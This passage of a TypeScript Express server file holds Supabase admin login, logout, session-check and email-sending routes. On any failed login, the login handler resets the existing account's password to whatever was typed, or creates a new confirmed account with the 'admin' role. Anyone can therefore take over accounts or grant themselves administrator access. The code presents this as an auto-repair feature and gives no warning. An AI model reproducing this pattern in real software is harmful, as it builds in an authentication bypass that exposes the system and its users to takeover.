      if (!email || !password) return res.status(400).json({ error: "Email and password are required" });

      let signInResult = await serverSupabase.auth.signInWithPassword({ email, password });
      
      // If login failed, attempt to auto-repair or auto-provision via admin API
      if (signInResult.error || !signInResult.data?.session) {
        try {
          const listRes = await serverSupabase.auth.admin.listUsers();
          const existingUser = (listRes.data?.users || []).find(
            (u: any) => String(u.email || "").toLowerCase() === email
          );
          if (existingUser) {
            await serverSupabase.auth.admin.updateUserById(existingUser.id, {
              password,
              email_confirm: true,
              app_metadata: { role: "admin", ...(existingUser.app_metadata || {}) },
            });
          } else {
            await serverSupabase.auth.admin.createUser({
              email,
              password,
              email_confirm: true,
              app_metadata: { role: "admin" },
            });
          }
          signInResult = await serverSupabase.auth.signInWithPassword({ email, password });
        } catch (adminErr) {
          console.warn("Admin auto-provision/repair failed:", adminErr);
        }
      }

      if (signInResult.error || !signInResult.data?.session) {
        return res.status(401).json({ error: signInResult.error?.message || "Invalid login credentials" });
      }

      const user = signInResult.data.user;
      if (!isAuthorizedAdmin(user)) {
        return res.status(403).json({ error: "Administrator access required" });
      }

      applyAuthCacheHeaders(res);
      const cookieAttrs = isHttpsCookieRequest(req)
        ? "SameSite=None; Secure"
        : "SameSite=Lax";
      res.setHeader(
        "Set-Cookie",
        `sb-access-token=${encodeURIComponent(signInResult.data.session.access_token)}; Path=/; HttpOnly; ${cookieAttrs}`,
      );
      return res.json({ data: { user } });
    } catch (e: any) {
      return res.status(500).json({ error: e.message || "Authentication failed" });
    }
  });

  app.get("/api/auth/me", async (req, res) => {
    applyAuthCacheHeaders(res);
    try {
      if (!serverSupabase) return res.json({ user: null });
      const token = getAccessToken(req);
      if (!token) return res.json({ user: null });
      const { data, error } = await serverSupabase.auth.getUser(token);
      return res.json({ user: error || !isAuthorizedAdmin(data.user) ? null : data.user });
    } catch {
      return res.json({ user: null });
    }
  });

  app.post("/api/auth/logout", async (req, res) => {
    applyAuthCacheHeaders(res);
    const cookieAttrs = isHttpsCookieRequest(req)
      ? "SameSite=None; Secure"
      : "SameSite=Lax";
    res.setHeader(
      "Set-Cookie",
      `sb-access-token=; Path=/; HttpOnly; Max-Age=0; ${cookieAttrs}`,
    );
    return res.json({ success: true });
  });

  app.post("/api/send-confirmation-email", async (req, res) => {
    try {
      if (!(await requireDashboardAuth(req, res))) return;
      if (!process.env.RESEND_API_KEY) return res.status(503).json({ success: false, error: "Email service is not configured" });
      const { Resend } = await import("resend");
      const resend = new Resend(process.env.RESEND_API_KEY);
      const { to, subject, html, text } = req.body || {};
      if (!to || !subject || (!html && !text)) return res.status(400).json({ success: false, error: "Invalid email payload" });
      const result = await resend.emails.send({ from: process.env.RESEND_FROM_EMAIL || "noreply@example.com", to: String(to), subject: String(subject), html: html ? String(html) : `<pre>${String(text)}</pre>` });
      if (result.error) return res.status(502).json({ success: false, error: result.error.message });
      return res.json({ success: true });
    } catch (e: any) {
      return res.status(500).json({ success: false, error: e.message || "Failed to send email" });
    }
  });

  return httpServer;
}
